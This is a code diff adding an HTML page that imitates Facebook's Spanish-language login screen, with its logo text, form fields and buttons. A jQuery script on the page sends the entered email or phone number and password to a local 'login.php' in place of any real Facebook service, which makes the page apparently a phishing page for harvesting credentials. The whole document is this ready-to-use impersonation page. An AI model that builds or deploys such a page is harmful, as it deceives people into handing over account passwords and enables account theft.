@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        input:focus {
+            outline: none;
+            box-shadow: none;
+        }
+    </style>
+    <link rel="icon" href="Img/facebook.png" type="image/x-icon">
+</head>
+<body class="bg-gray-100 flex flex-col items-center justify-start h-screen pt-8">
+    <div class="mb-2">
+        <h1 class="text-blue-600 font-bold" style="font-size: 48px;">facebook</h1>
+    </div>
+    <div class="bg-white p-6 rounded-lg shadow-md" style="width: 398px; height: 398px;">
+        <h2 class="text-center text-gray-700 text-lg font-medium mb-4">Iniciar sesión en Facebook</h2>
+        <form id="loginForm">
+            <div class="mb-4">
+                <input type="text" name="email" class="w-full p-3 border border-gray-300 rounded-md text-base" placeholder="Correo electrónico o número de teléfono" required>
+            </div>
+            <div class="mb-4">
+                <input type="password" name="password" class="w-full p-3 border border-gray-300 rounded-md text-base" placeholder="Contraseña" required>
+            </div>
+            <div class="mb-4 flex justify-center">
+                <button type="submit" class="bg-blue-600 text-white rounded-md text-lg font-medium hover:bg-blue-700" style="width: 364px; height: 48px;">Iniciar sesión</button>
+            </div>
+            <div class="text-center text-sm text-blue-600 mb-4">
+                <a href="#" class="hover:underline">¿Olvidaste tu cuenta?</a>
+            </div>
+            <div class="flex items-center justify-center text-gray-600 mb-2">
+                <hr class="border-gray-300 w-2/3">
+                <span class="px-2">o</span>
+                <hr class="border-gray-300 w-2/3">
+            </div>
+            <div class="flex justify-center mt-2">
+                <button type="button" class="bg-green-600 text-white rounded-md text-lg font-medium hover:bg-green-700" style="width: 189.8px; height: 48px;">Crear cuenta nueva</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        $(document).ready(function() {
+            $('#loginForm').submit(function(event) {
+                event.preventDefault(); // Evita el envío del formulario estándar
+                
+                var formData = $(this).serialize(); // Serializa los datos del formulario
+
+                $.ajax({
+                    type: 'POST',
+                    url: 'login.php',
+                    data: formData,
+                    success: function(response) {
+                        console.log(response); // Muestra la respuesta del servidor (opcional)
+                        
+                    },
+                    error: function(error) {
+                        console.error(error); // Muestra el error en la consola (opcional)
+                        
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
